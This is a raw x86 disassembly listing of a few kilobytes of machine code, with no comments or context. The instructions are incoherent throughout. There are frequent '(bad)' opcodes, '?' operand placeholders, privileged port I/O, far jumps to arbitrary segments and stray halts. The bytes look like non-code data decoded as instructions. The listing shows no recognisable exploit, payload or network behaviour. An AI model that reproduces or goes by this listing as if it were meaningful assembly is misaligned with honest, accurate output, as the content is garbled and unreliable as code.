  4118d4:	sbb    ah,BYTE PTR [edi+eax*4-0x53c0b08f]
  4118db:	mov    ecx,gs
  4118dd:	in     al,0x92
  4118df:	ins    BYTE PTR es:[edi],dx
  4118e0:	push   esi
  4118e1:	leave  
  4118e2:	mov    esi,0x634d2701
  4118e7:	stc    
  4118e8:	push   0xffffffac
  4118ea:	fisttp DWORD PTR [ebp-0x1ee31b92]
  4118f0:	stos   DWORD PTR es:[edi],eax
  4118f1:	pusha  
  4118f2:	aad    0x8c
  4118f4:	jmp    0xa261:0xc767e7b2
  4118fb:	mov    dl,0x3e
  4118fd:	mov    esp,0x57a3e95
  411902:	or     eax,0x7ed5714
  411907:	aad    0xbd
  411909:	sub    BYTE PTR [ebp-0x39dfaa03],0x1d
  411910:	push   ss
  411911:	out    0xe6,al
  411913:	sbb    eax,0x4cdfec1b
  411918:	push   eax
  411919:	or     eax,0x3c0dab5c
  41191e:	lock and DWORD PTR [ecx+ebx*4-0x6c],ebp
  411923:	inc    edi
  411924:	loop   0x411926
  411926:	ret    0xaa84
  411929:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41192a:	ss mov esi,0x647f2625
  411930:	pop    ss
  411931:	cdq    
  411932:	(bad)  
  411933:	aas    
  411934:	push   esp
  411935:	aas    
  411936:	jne    0x411940
  411938:	jle    0x4118e6
  41193a:	xor    al,BYTE PTR [esi+eiz*2+0x16]
  41193e:	lock dec esp
  411940:	fldcw  WORD PTR [ebp-0xc]
  411943:	into   
  411944:	jae    0x41198e
  411946:	les    edi,FWORD PTR [edi+0x55]
  411949:	in     al,0x5d
  41194b:	adc    edi,0xffffff90
  41194e:	ret    
  41194f:	xor    DWORD PTR [ecx+0x6],ebx
  411952:	bsr    ebp,DWORD PTR [ebx+0x52]
  411956:	in     al,dx
  411957:	sub    bl,dh
  411959:	mov    al,0xf9
  41195b:	push   cs
  41195c:	or     BYTE PTR [ebx+0x2e],al
  41195f:	cmp    eax,0x96b3725e
  411964:	(bad)  
  411965:	lds    edi,FWORD PTR [edx]
  411967:	jns    0x411918
  411969:	sbb    eax,DWORD PTR [ebp+0x4c]
  41196c:	and    eax,0xb97383b0
  411971:	fisubr WORD PTR [ebp+0x7a88d9ec]
  411977:	add    BYTE PTR [eax-0x18cc2970],ch
  41197d:	push   0x4e
  41197f:	fwait
  411980:	xchg   ecx,eax
  411981:	ins    DWORD PTR es:[edi],dx
  411982:	pop    ss
  411983:	push   edx
  411984:	xor    al,0xe5
  411986:	adc    eax,DWORD PTR [esi+0xb6bae69]
  41198c:	fs pop esi
  41198e:	xchg   edx,eax
  41198f:	icebp  
  411990:	adc    cl,dl
  411992:	xchg   ebx,eax
  411993:	jne    0x411959
  411995:	dec    esi
  411996:	jbe    0x411989
  411998:	xchg   esi,eax
  411999:	pusha  
  41199a:	(bad)  [ecx-0xa]
  41199d:	adc    DWORD PTR [ecx+esi*1-0x51864687],esi
  4119a4:	inc    ebx
  4119a5:	in     eax,0x20
  4119a7:	hlt    
  4119a8:	(bad)  
  4119a9:	jp     0x411973
  4119ab:	call   0xbbdc:0xd4f86647
  4119b2:	(bad)  
  4119b3:	cmp    cl,BYTE PTR [ebx]
  4119b5:	push   eax
  4119b6:	inc    esp
  4119b7:	mov    ebx,DWORD PTR ds:0x4a16f3a
  4119bd:	mov    DWORD PTR [esi],0x7ee65b02
  4119c3:	or     al,0xd9
  4119c5:	push   ds
  4119c6:	sub    eax,0xa08cda9d
  4119cb:	gs (bad) 
  4119cd:	pusha  
  4119ce:	mov    DWORD PTR [edx],0xc0810b5e
  4119d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119d5:	ja     0x411a47
  4119d7:	pop    esi
  4119d8:	icebp  
  4119d9:	sbb    eax,0xa1458fdb
  4119de:	fisubr WORD PTR [esi+0x24af6b4b]
  4119e4:	hlt    
  4119e5:	out    dx,al
  4119e6:	pop    esi
  4119e7:	xchg   ebp,eax
  4119e8:	pop    edi
  4119e9:	mov    al,0x32
  4119eb:	fsub   QWORD PTR [ecx+edi*2-0x18]
  4119ef:	hlt    
  4119f0:	xchg   ebx,eax
  4119f1:	inc    edi
  4119f2:	mov    DWORD PTR [edi-0x4572abb5],esi
  4119f8:	push   edi
  4119f9:	mov    BYTE PTR [eax],dh
  4119fb:	call   0x1043:0xc1201252
  411a02:	clc    
  411a03:	loope  0x411a2f
  411a05:	(bad)
  411a09:	sub    al,0x2f
  411a0c:	xlat   BYTE PTR ds:[ebx]
  411a0d:	sub    al,0x1c
  411a0f:	cmc    
  411a10:	(bad)  
  411a11:	dec    ebx
  411a13:	pusha  
  411a14:	and    esp,DWORD PTR [eax+0xb]
  411a17:	push   edx
  411a18:	aas    
  411a19:	enter  0x53df,0xe0
  411a1d:	aas    
  411a1e:	sbb    eax,0x392386c8
  411a23:	int    0xf2
  411a25:	mov    WORD PTR [eax],?
  411a27:	and    ebx,esp
  411a29:	mov    bl,0xd3
  411a2b:	jmp    FWORD PTR [ebx]
  411a2d:	shl    DWORD PTR [esp+ebp*1],0xca
  411a31:	mov    ebp,0x18ff005d
  411a36:	fsub   DWORD PTR [eax+0x33]
  411a39:	jle    0x411a4f
  411a3b:	pop    es
  411a3c:	and    BYTE PTR [edi-0x80],0x2
  411a40:	sbb    al,0x6c
  411a42:	ss pusha 
  411a44:	push   ss
  411a45:	mov    cl,0xcb
  411a47:	sbb    BYTE PTR [edi],bh
  411a49:	out    0x4e,al
  411a4b:	push   edi
  411a4c:	fistp  WORD PTR [ecx-0x39]
  411a4f:	clc    
  411a50:	mov    ebp,0x84a397cf
  411a55:	mov    ds,WORD PTR [edx+0x41cba97c]
  411a5b:	repz xor ecx,esp
  411a5e:	stos   DWORD PTR es:[edi],eax
  411a5f:	xor    dl,ah
  411a61:	(bad)  
  411a62:	out    dx,eax
  411a63:	jnp    0x411a09
  411a65:	push   ecx
  411a66:	daa    
  411a67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a68:	scas   eax,DWORD PTR es:[edi]
  411a69:	sti    
  411a6a:	jno    0x411a11
  411a6c:	aam    0xd0
  411a6e:	adc    DWORD PTR [eax],edi
  411a70:	inc    edi
  411a71:	push   cs
  411a72:	sub    ecx,DWORD PTR [ebx-0x5b]
  411a75:	sub    eax,0x1ace912a
  411a7a:	mov    cs,WORD PTR [esi+0x5c58ced5]
  411a80:	pop    es
  411a81:	rcl    DWORD PTR [esi+0xa77959a],cl
  411a87:	pop    ebx
  411a88:	and    WORD PTR [esp+eiz*2+0x30],0x3e
  411a8e:	or     dl,BYTE PTR [eax-0x597993a0]
  411a94:	int    0xd8
  411a96:	(bad)  
  411a98:	mov    esp,0xf92de597
  411a9d:	xchg   BYTE PTR [ecx-0x58],dh
  411aa0:	push   0xcea2ac84
  411aa5:	pop    ds
  411aa6:	pop    ss
  411aa7:	add    esi,DWORD PTR [ecx+eax*4]
  411aaa:	repnz out 0x30,al
  411aad:	add    eax,0xa8f5b50e
  411ab2:	cmp    dh,ah
  411ab4:	loope  0x411ad6
  411ab6:	cmp    edx,edx
  411ab8:	sbb    al,0xa0
  411aba:	or     ebx,ebp
  411abc:	xchg   edi,eax
  411abd:	mov    ebp,0x4d87337b
  411ac2:	sub    al,0x5b
  411ac4:	sbb    ecx,DWORD PTR [edx]
  411ac6:	jg     0x411a87
  411ac8:	aaa    
  411ac9:	pop    eax
  411aca:	imul   edx,DWORD PTR [edi+0x160e3338],0x8fa3d3fa
  411ad4:	cmp    DWORD PTR [ebx+edi*4],edx
  411ad7:	bound  edi,QWORD PTR [esi]
  411ad9:	mov    edi,0x1498e9f5
  411ade:	and    al,0x70
  411ae0:	hlt    
  411ae1:	leave  
  411ae2:	mov    ebx,0x60ef27d3
  411ae7:	imul   eax,DWORD PTR [edi+0x2e884ed4],0x6efb9bdc
  411af1:	shr    edx,1
  411af3:	sub    al,0x5f
  411af5:	mov    dh,0x56
  411af7:	push   esi
  411af8:	into   
  411af9:	in     eax,0xf3
  411afb:	pop    ds
  411afc:	xchg   edx,eax
  411afd:	xchg   DWORD PTR ds:0x6802032e,edi
  411b03:	dec    ebx
  411b04:	push   0x592603cf
  411b09:	push   edi
  411b0a:	mov    al,ds:0x8286f1c1
  411b0f:	cs enter 0x3e70,0x2e
  411b14:	into   
  411b15:	data16 (bad) 
  411b17:	xor    eax,edi
  411b19:	pop    ebp
  411b1a:	ds dec eax
  411b1c:	push   esi
  411b1d:	xlat   BYTE PTR ds:[ebx]
  411b1e:	popf   
  411b1f:	int    0x4a
  411b21:	xchg   ebp,eax
  411b22:	add    bh,bl
  411b24:	jmp    0x411ae2
  411b26:	iret   
  411b27:	shl    DWORD PTR [esi+0x2bede3f7],1
  411b2d:	popa   
  411b2e:	cmp    ebp,DWORD PTR [ecx-0x4b]
  411b31:	out    0x5f,al
  411b33:	nop
  411b34:	cmp    edx,esp
  411b36:	or     al,0x1a
  411b38:	dec    edi
  411b39:	in     eax,0x67
  411b3b:	or     ecx,DWORD PTR [esi+0x31]
  411b3e:	pop    edx
  411b3f:	(bad)  
  411b40:	fild   WORD PTR [ecx]
  411b42:	sub    BYTE PTR ds:0xb4a95c1f,ah
  411b48:	or     al,0x5b
  411b4a:	in     eax,dx
  411b4b:	jns    0x411b01
  411b4d:	mov    ecx,0x7ca4cb3
  411b52:	adc    ah,BYTE PTR [esi-0x35cfff4b]
  411b58:	pop    ecx
  411b59:	ins    BYTE PTR es:[edi],dx
  411b5a:	mov    dh,0x48
  411b5c:	dec    eax
  411b5d:	sub    al,0x63
  411b5f:	mov    esp,0xe3cd44ad
  411b64:	std    
  411b65:	fst    DWORD PTR [edi]
  411b67:	add    ecx,DWORD PTR [ebx+0x6f4b2b69]
  411b6d:	fld    QWORD PTR ds:0xd7416c10
  411b73:	or     ah,ah
  411b75:	dec    ecx
  411b76:	int    0x81
  411b78:	mov    WORD PTR [ebx],?
  411b7a:	in     al,dx
  411b7b:	xchg   edi,eax
  411b7c:	and    al,BYTE PTR [eax-0x2967f018]
  411b82:	dec    esp
  411b83:	or     al,BYTE PTR [ecx+0x2c75a639]
  411b89:	pop    edi
  411b8a:	cwde   
  411b8b:	jl     0x411b44
  411b8d:	fwait
  411b8e:	pop    ebp
  411b8f:	loop   0x411b94
  411b91:	test   BYTE PTR [edi-0x47287561],dh
  411b97:	push   0xcb5dd0f1
  411b9c:	xchg   edx,eax
  411b9d:	or     al,0xbd
  411b9f:	ja     0x411b33
  411ba1:	mov    DWORD PTR [esi-0x44d063fa],ebp
  411ba7:	jg     0x411c1b
  411ba9:	and    al,0x42
  411bab:	jnp    0x411b9e
  411bad:	push   es
  411bae:	adc    DWORD PTR [ebp-0x7a34e9c4],edx
  411bb4:	call   0x6e8a:0x26646c5e
  411bbb:	sbb    edi,esp
  411bbd:	lods   eax,DWORD PTR ds:[esi]
  411bbe:	rcr    DWORD PTR ds:0x693d408e,cl
  411bc4:	xchg   esp,eax
  411bc5:	stc    
  411bc6:	xor    DWORD PTR ds:[ecx-0x3a],0xffffffcc
  411bcb:	(bad)
  411bce:	in     eax,0x4f
  411bd0:	fcomp  QWORD PTR [edx-0x6b66cba4]
  411bd6:	push   es
  411bd7:	cmp    eax,0x7bb01a03
  411bdc:	mov    esi,0x3898f3e7
  411be1:	mov    eax,0x145aa7f5
  411be6:	and    eax,0xf5067c6f
  411beb:	sub    bh,BYTE PTR [ecx]
  411bed:	scas   eax,DWORD PTR es:[edi]
  411bee:	hlt    
  411bef:	dec    ebp
  411bf0:	repz mov eax,es:0xc3ff5ae
  411bf7:	popf   
  411bf8:	inc    esi
  411bf9:	fisubr DWORD PTR [ebp-0x74]
  411bfc:	fisubr WORD PTR [eax+0x6bbe9915]
  411c02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c03:	xchg   ebp,eax
  411c04:	jmp    0x411c72
  411c06:	and    al,0x70
  411c08:	rcr    eax,cl
  411c0a:	or     BYTE PTR [eax+0x29],cl
  411c0d:	dec    edi
  411c0e:	cwde   
  411c0f:	cdq    
  411c10:	dec    ebx
  411c11:	pop    ecx
  411c12:	dec    ebx
  411c13:	add    eax,0xec93c754
  411c18:	inc    edi
  411c19:	fs cdq 
  411c1b:	inc    esp
  411c1c:	scas   eax,DWORD PTR es:[edi]
  411c1d:	xchg   ecx,eax
  411c1e:	xlat   BYTE PTR ds:[ebx]
  411c1f:	adc    eax,0x1476fc0f
  411c24:	mov    ebx,0xdaa5339
  411c29:	sbb    DWORD PTR [ebp-0x1],edx
  411c2c:	push   0x9df59bc9
  411c31:	jae    0x411bea
  411c33:	dec    ecx
  411c34:	adc    BYTE PTR [esp+eiz*2],al
  411c37:	les    edi,FWORD PTR [eax+0x39]
  411c3a:	call   0x64c5bdf2
  411c3f:	or     eax,0x8afad15b
  411c44:	out    0x6,eax
  411c46:	and    DWORD PTR [esi],0x6f
  411c49:	inc    eax
  411c4a:	push   ebp
  411c4b:	mov    ah,0xc5
  411c4d:	loope  0x411bf2
  411c4f:	outs   dx,BYTE PTR ds:[esi]
  411c50:	push   ecx
  411c51:	add    ecx,edi
  411c53:	jg     0x411c5d
  411c55:	xchg   ecx,eax
  411c56:	mov    dl,BYTE PTR [ecx]
  411c58:	sar    BYTE PTR [edx+0x65],1
  411c5b:	ja     0x411cd5
  411c5d:	push   0xf68e84de
  411c62:	cmp    eax,0xb9eae27d
  411c67:	ret    0xc7d3
  411c6a:	into   
  411c6b:	add    BYTE PTR [esi-0x6ae5d03f],cl
  411c71:	js     0x411cd7
  411c73:	sub    BYTE PTR [ebx],dh
  411c75:	shl    DWORD PTR [ebp+eax*8-0x5cac8656],0x6e
  411c7d:	jns    0x411c6b
  411c7f:	pop    ebp
  411c80:	(bad)  [eax+0x2c502caa]
  411c86:	rol    DWORD PTR [edx],1
  411c88:	cs mov ebx,0xcbdcc734
  411c8e:	leave  
  411c8f:	cli    
  411c90:	(bad)  
  411c91:	pushf  
  411c92:	out    dx,eax
  411c93:	jge    0x411c90
  411c95:	std    
  411c96:	pop    eax
  411c97:	cdq    
  411c98:	push   ds
  411c99:	(bad)  
  411c9b:	mov    DWORD PTR [esi+0x27],esi
  411c9e:	mov    ds:0x388db62d,eax
  411ca3:	in     al,dx
  411ca4:	stc    
  411ca5:	mov    al,0xd0
  411ca7:	int    0x86
  411ca9:	cdq    
  411caa:	xor    DWORD PTR [eax+0x63],ebx
  411cad:	les    ebx,FWORD PTR [edx+0x48]
  411cb0:	jnp    0x411d20
  411cb2:	in     al,dx
  411cb3:	add    eax,0x369641de
  411cb8:	js     0x411c67
  411cba:	(bad)  [eax]
  411cbc:	sub    BYTE PTR [esi+0x5b],dl
  411cbf:	xchg   esp,eax
  411cc0:	fsubr  QWORD PTR [esi-0xd037f9c]
  411cc6:	and    eax,0x6a97ed1b
  411ccb:	lea    ebx,[ecx]
  411ccd:	mov    cl,0x42
  411ccf:	dec    edx
  411cd0:	mov    al,ds:0xdd151611
  411cd5:	inc    ebp
  411cd6:	imul   ebp,ebp,0xed7317e3
  411cdc:	aam    0xf3
  411cde:	out    0x1a,al
  411ce0:	push   cs
  411ce1:	stc    
  411ce2:	mov    cl,0x3b
  411ce4:	gs cdq 
  411ce6:	mov    eax,ds:0x8ee60454
  411ceb:	dec    esi
  411cec:	cli    
  411ced:	xor    esi,edx
  411cef:	xchg   BYTE PTR [edi],ah
  411cf1:	dec    esi
  411cf2:	xor    BYTE PTR [edi],al
  411cf4:	(bad)  
  411cf5:	inc    eax
  411cf6:	hlt    
  411cf7:	cmc    
  411cf8:	add    bl,BYTE PTR [eax]
  411cfa:	or     DWORD PTR [ecx+0x7c],ebp
  411cfd:	sub    DWORD PTR [esi],ebx
  411cff:	and    eax,0x9b1f7a91
  411d04:	xchg   esp,eax
  411d05:	fwait
  411d06:	push   0xdb89dcff
  411d0b:	aam    0xe7
  411d0d:	mov    al,ds:0xa0923dc0
  411d12:	push   esp
  411d13:	xchg   esi,eax
  411d14:	xor    ebx,DWORD PTR [ebx]
  411d16:	(bad)  
  411d17:	sbb    bl,BYTE PTR [eax-0x39c8c6f7]
  411d1d:	xor    al,0x8b
  411d1f:	inc    esp
  411d20:	out    dx,eax
  411d21:	sti    
  411d22:	cmp    DWORD PTR ds:0xafdb3c6,0xfffffff3
  411d29:	push   esi
  411d2a:	out    dx,eax
  411d2b:	imul   esp,DWORD PTR [eax],0xffffffe1
  411d2e:	iret   
  411d2f:	inc    edx
  411d30:	push   0xa6ded6b9
  411d35:	das    
  411d36:	mov    edi,0xeed9275
  411d3b:	push   ds
  411d3c:	inc    edi
  411d3d:	call   0x9d63b840
  411d42:	adc    eax,DWORD PTR [ecx+0x26]
  411d45:	jp     0x411d70
  411d47:	inc    edi
  411d48:	jmp    0xb5cca972
  411d4d:	pop    ss
  411d4e:	mov    WORD PTR [esp+edi*1+0x3f079ced],cs
  411d55:	cmp    eax,0x3be92c15
  411d5a:	ret    0x6040
  411d5d:	inc    edi
  411d5e:	inc    ebx
  411d5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d60:	xchg   BYTE PTR [ebp-0x15ff52b6],al
  411d66:	ds stos DWORD PTR es:[edi],eax
  411d68:	dec    edx
  411d69:	lock hlt 
  411d6b:	adc    BYTE PTR [ebp-0x4],0x3a
  411d6f:	push   esp
  411d70:	sub    BYTE PTR [ecx],ch
  411d72:	fcmovb st,st(4)
  411d74:	sbb    al,bl
  411d76:	inc    edi
  411d77:	dec    edi
  411d78:	loop   0x411d89
  411d7a:	icebp  
  411d7b:	lods   al,BYTE PTR ds:[esi]
  411d7c:	and    edi,DWORD PTR [ecx-0x58]
  411d7f:	(bad)  
  411d80:	dec    edi
  411d81:	cmp    DWORD PTR [esi+esi*4],ebx
  411d84:	or     ch,cl
  411d86:	and    DWORD PTR [ecx+edi*8+0x7e28c3ea],edx
  411d8d:	or     dl,BYTE PTR [edx+eiz*4]
  411d90:	add    eax,DWORD PTR [eax-0x6392b5a9]
  411d96:	cmp    eax,0x3f3e7df1
  411d9b:	lods   al,BYTE PTR ds:[esi]
  411d9c:	or     edx,DWORD PTR [ecx+0x7dc07bbc]
  411da2:	inc    ecx
  411da3:	out    0x7f,al
  411da5:	mov    dh,0xf0
  411da7:	add    al,0x52
  411da9:	xor    esi,DWORD PTR ss:[eax+eiz*2]
  411dad:	inc    edi
  411dae:	iret   
  411daf:	mov    ds:0x373eb806,al
  411db4:	adc    DWORD PTR [ecx+0x6d],esi
  411db7:	jne    0x411d4b
  411db9:	push   edi
  411dba:	ret    0xf02e
  411dbd:	jge    0x411e11
  411dbf:	aaa    
  411dc0:	xchg   ebp,eax
  411dc1:	inc    bl
  411dc3:	out    0xe3,eax
  411dc5:	adc    BYTE PTR [edi+ebx*1],ah
  411dc8:	mov    DWORD PTR [esi-0x22],esp
  411dcb:	ins    BYTE PTR es:[edi],dx
  411dcc:	mov    ecx,ebp
  411dce:	and    dl,BYTE PTR [edx+0x5b82d7f9]
  411dd4:	sub    DWORD PTR [edx+0x6f],edi
  411dd7:	pop    ss
  411dd8:	sub    eax,DWORD PTR ds:0x9a0602de
  411dde:	inc    edx
  411ddf:	js     0x411e12
  411de1:	push   ss
  411de2:	jp     0x411df5
  411de4:	fcmovb st,st(7)
  411de6:	mov    bl,0x1d
  411de8:	mov    esi,0xaf3a2eb3
  411ded:	ds push 0x2aedbfde
  411df3:	add    ch,bl
  411df5:	xor    cl,BYTE PTR [eax+0x4cadf3d5]
  411dfb:	aam    0xc3
  411dfd:	or     bh,BYTE PTR [ebx+0x2c]
  411e00:	iret   
  411e01:	jge    0x411dae
  411e03:	jl     0x411e3c
  411e05:	or     eax,0xc7ff8d4b
  411e0a:	data16 sbb BYTE PTR [eax-0x686afc2c],dh
  411e11:	iret   
  411e12:	aam    0xaf
  411e14:	je     0x411e7a
  411e16:	ds cmp al,0x80
  411e19:	pop    edi
  411e1a:	cmp    eax,0x8fe48f57
  411e1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e20:	fdivr  QWORD PTR [edi-0x31]
  411e23:	cmp    eax,0x3d92af41
  411e28:	push   ebx
  411e29:	xchg   ebx,eax
  411e2a:	fwait
  411e2b:	in     eax,dx
  411e2c:	push   esp
  411e2d:	push   0xde20cb10
  411e32:	mov    ds:0x28ca42b5,al
  411e37:	add    al,0xa
  411e39:	aaa    
  411e3a:	xor    BYTE PTR [eax+ebp*1-0x24],bl
  411e3e:	ja     0x411e1b
  411e40:	push   eax
  411e41:	mov    bl,0xae
  411e43:	xchg   bh,dl
  411e45:	xor    DWORD PTR [edi-0x41],edi
  411e48:	ret    
  411e49:	in     eax,dx
  411e4a:	leave  
  411e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e4c:	int    0xad
  411e4e:	xor    dh,ch
  411e50:	into   
  411e51:	or     bh,BYTE PTR [esi]
  411e53:	cld    
  411e54:	pop    edx
  411e55:	nop
  411e56:	(bad)  
  411e58:	adc    bh,al
  411e5a:	mov    dl,0x95
  411e5c:	in     al,dx
  411e5d:	sbb    ebx,esp
  411e5f:	push   cs
  411e60:	outs   dx,DWORD PTR ds:[esi]
  411e61:	inc    esp
  411e62:	out    0xbf,al
  411e64:	dec    ecx
  411e65:	sub    BYTE PTR ds:0x98e459dd,dl
  411e6b:	(bad)  
  411e6c:	loopne 0x411dee
  411e6e:	pop    ecx
  411e6f:	loope  0x411ea5
  411e71:	fld    QWORD PTR [edi+eiz*4]
  411e74:	adc    eax,0xbbd364e2
  411e79:	cld    
  411e7a:	adc    eax,DWORD PTR ds:[eax+edx*4-0x6a]
  411e7f:	in     eax,0x61
  411e81:	and    DWORD PTR [edi],edx
  411e83:	ror    DWORD PTR [ebx+0x40],0x41
  411e87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e88:	je     0x411ed9
  411e8a:	cld    
  411e8b:	pop    esi
  411e8c:	inc    ebp
  411e8d:	sub    al,BYTE PTR [ecx+0x2c675250]
  411e93:	dec    ebp
  411e94:	dec    ebp
  411e95:	sbb    DWORD PTR [ecx],ebx
  411e97:	and    DWORD PTR [esi-0x2f3f0c07],esp
  411e9d:	jl     0x411e34
  411e9f:	add    al,BYTE PTR [ebp-0x487bbfce]
  411ea5:	inc    ebx
  411ea6:	xlat   BYTE PTR ds:[ebx]
  411ea7:	or     DWORD PTR cs:[edi-0x469b0892],0xdd9c8f82
  411eb2:	in     al,0x7
  411eb4:	fidivr WORD PTR [eax+0x52]
  411eb7:	xlat   BYTE PTR ds:[ebx]
  411eb8:	call   DWORD PTR [esi-0x4fe5291c]
  411ebe:	adc    bl,BYTE PTR [ecx+0x4b80c33]
  411ec4:	repz mov ah,0xe5
  411ec7:	mov    bl,0x58
  411ec9:	loop   0x411e5c
  411ecb:	aaa    
  411ecc:	cld    
  411ecd:	lock fstp QWORD PTR [eax+0x79]
  411ed1:	ss mov al,0x2a
  411ed4:	push   ebx
  411ed5:	push   eax
  411ed6:	mov    esp,0x91c2d785
  411edb:	das    
  411edc:	imul   edx,DWORD PTR [esi+0x6c],0xffffffba
  411ee0:	xchg   ebp,eax
  411ee1:	leave  
  411ee2:	imul   esi,DWORD PTR [ebx+0x43],0x181e8a91
  411ee9:	xor    cl,bl
  411eeb:	cdq    
  411eec:	mov    ds:0x674b7d84,al
  411ef2:	dec    ebp
  411ef3:	lea    edx,[ebx-0x17]
  411ef6:	jmp    0xc1fc7352
  411efb:	mov    ds:0xdfff3b4,eax
  411f00:	retf   
  411f01:	mov    dh,0x10
  411f03:	lock push eax
  411f05:	sub    bl,ah
  411f07:	inc    ebp
  411f08:	mov    edx,0x26f95d7d
  411f0d:	repz cmp al,BYTE PTR [edx+eiz*1+0x53a10a53]
  411f15:	bound  ebp,QWORD PTR [esi+ebx*4+0x7]
  411f19:	push   ecx
  411f1a:	jge    0x411f28
  411f1c:	and    eax,0x681ae302
  411f21:	ds stos DWORD PTR es:[edi],eax
  411f23:	retf   0xfd53
  411f26:	pop    ebx
  411f27:	jmp    0x411ec8
  411f29:	ins    DWORD PTR es:[edi],dx
  411f2a:	sub    bl,bh
  411f2c:	and    DWORD PTR [eax-0x113b15aa],0x9a263256
  411f36:	hlt    
  411f37:	inc    edi
  411f38:	ins    DWORD PTR es:[edi],dx
  411f39:	mov    bh,0xc8
  411f3b:	enter  0xe41e,0x95
  411f3f:	pop    ds
  411f40:	and    eax,0x7e1e077c
  411f45:	push   cs
  411f46:	mov    esp,0x360e3b07
  411f4b:	xlat   BYTE PTR ds:[ebx]
  411f4c:	int3   
  411f4d:	shl    DWORD PTR ds:0x14348564,0x18
  411f54:	stos   DWORD PTR es:[edi],eax
  411f55:	add    BYTE PTR [esi],0x44
  411f58:	sub    eax,0xa9fef964
  411f5d:	mov    eax,0x6f8870a8
  411f63:	inc    eax
  411f64:	das    
  411f65:	or     al,0x88
  411f67:	fbld   TBYTE PTR [edi]
  411f69:	std    
  411f6a:	jl     0x411f12
  411f6c:	mov    ds:0xa50c767f,al
  411f71:	jne    0x411f91
  411f73:	xor    cl,ah
  411f75:	mov    cl,0xbf
  411f77:	pop    ds
  411f78:	out    0xef,al
  411f7a:	dec    edi
  411f7b:	in     al,0xaf
  411f7d:	stos   DWORD PTR es:[edi],eax
  411f7e:	mul    BYTE PTR ds:0x13407f6
  411f84:	push   edx
  411f85:	mov    eax,ebx
  411f87:	(bad)  
  411f88:	jl     0x411fce
  411f8a:	jb     0x412008
  411f8c:	shl    BYTE PTR [edx+0x3036],cl
  411f92:	(bad)  
  411f93:	dec    esi
  411f94:	ds or  eax,0xf713b1ad
  411f9a:	(bad)  
  411f9b:	sub    eax,0x4c24a0dd
  411fa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fa1:	out    0x5f,al
  411fa3:	xor    al,0x8c
  411fa5:	in     al,dx
  411fa6:	jo     0x411f54
  411fa8:	and    dh,bl
  411faa:	dec    ecx
  411fab:	and    eax,0xc782a63
  411fb0:	pop    eax
  411fb1:	fist   WORD PTR [ebx]
  411fb3:	dec    ecx
  411fb4:	jnp    0x411f7b
  411fb6:	or     eax,0x1537874c
  411fbb:	cld    
  411fbc:	jl     0x412007
  411fbe:	(bad)  
  411fbf:	retf   0x9d90
  411fc2:	pop    ecx
  411fc3:	shl    BYTE PTR [ecx],cl
  411fc5:	jae    0x412013
  411fc7:	repnz fistp WORD PTR [eax-0x81379cf]
  411fce:	xor    cl,dl
  411fd0:	jmp    0x3f9b:0xccde59a6
  411fd7:	dec    ecx
  411fd8:	imul   esi,eax,0x76476cce
  411fde:	sbb    al,0x26
  411fe0:	push   edx
  411fe1:	int    0xae
  411fe3:	push   es
  411fe4:	pop    ss
  411fe5:	es jmp 0xc5b6:0x3bbc0803
  411fed:	push   esi
  411fee:	in     eax,dx
  411fef:	cmp    eax,DWORD PTR [ecx-0x19]
  411ff2:	adc    eax,0x336aec43
  411ff7:	mov    edx,0xcebfb6
  411ffc:	out    0x40,al
  411ffe:	jg     0x412026
  412000:	mov    edx,0x4a5d4b79
  412005:	dec    esi
  412006:	sahf   
  412007:	neg    BYTE PTR [ebp+0x63a2aa3f]
  41200d:	(bad)  
  41200e:	push   0x5
  412010:	ins    DWORD PTR es:[edi],dx
  412011:	in     al,dx
  412012:	add    eax,0xa317d9ee
  412017:	leave  
  412018:	xchg   ebp,eax
  412019:	fild   WORD PTR [ecx+0x69]
  41201c:	lods   eax,DWORD PTR ds:[esi]
  41201d:	jb     0x411fdc
  41201f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412020:	xchg   ecx,eax
  412021:	and    BYTE PTR [eax],dl
  412023:	loopne 0x411fab
  412025:	retf   
  412026:	inc    eax
  412027:	pop    ss
  412028:	adc    BYTE PTR [edx+edi*4-0x7c],dh
  41202c:	inc    esp
  41202d:	fs pop ds
  41202f:	adc    DWORD PTR [esi+0x1e],eax
  412032:	pushf  
  412033:	push   esp
  412034:	lea    eax,[ebx-0x2c]
  412037:	xor    DWORD PTR [esi+0x1c],edx
  41203a:	fsubr  QWORD PTR [edx+ebp*1+0x1a9ba601]
  412041:	inc    ebx
  412042:	xor    eax,0x4a7cc90e
  412047:	cmc    
  412048:	jmp    0x63ba:0xe4d265d9
  41204f:	push   0x228cec9
  412054:	and    BYTE PTR [ecx],ch
  412056:	rol    BYTE PTR [eax],cl
  412058:	xchg   edx,eax
  412059:	loopne 0x412079
  41205b:	popa   
  41205c:	popa   
  41205d:	add    al,0xa9
  41205f:	cwde   
  412060:	sbb    ecx,ebx
  412062:	scas   al,BYTE PTR es:[edi]
  412063:	jnp    0x412069
  412065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412066:	mov    ecx,0x6cf8b801
  41206b:	fucom  st(6)
  41206d:	fcom   DWORD PTR [eax]
  41206f:	test   eax,0xbedd76c4
  412074:	sub    al,0xf3
  412076:	mov    BYTE PTR [ebx+0x4cc9f21d],cl
  41207c:	mov    ah,0xc0
  41207e:	ins    BYTE PTR es:[edi],dx
  41207f:	rcl    BYTE PTR [edi],cl
  412081:	pop    ebx
  412082:	enter  0x16f5,0x37
  412086:	mov    al,0xbe
  412088:	pop    ebp
  412089:	xchg   ebp,eax
  41208a:	adc    eax,0xb3e0091a
  41208f:	dec    ebx
  412090:	sub    ch,BYTE PTR [esi]
  412092:	jmp    0x9ca63fa8
  412097:	in     al,dx
  412098:	add    esp,DWORD PTR [edi+0x2b]
  41209b:	stos   BYTE PTR es:[edi],al
  41209c:	dec    edi
  41209d:	(bad)  
  41209e:	sbb    al,bh
  4120a0:	call   0x8bdb6665
  4120a5:	aaa    
  4120a6:	out    dx,al
  4120a7:	adc    eax,0x9d54f470
  4120ac:	inc    ebx
  4120ad:	loope  0x4120cc
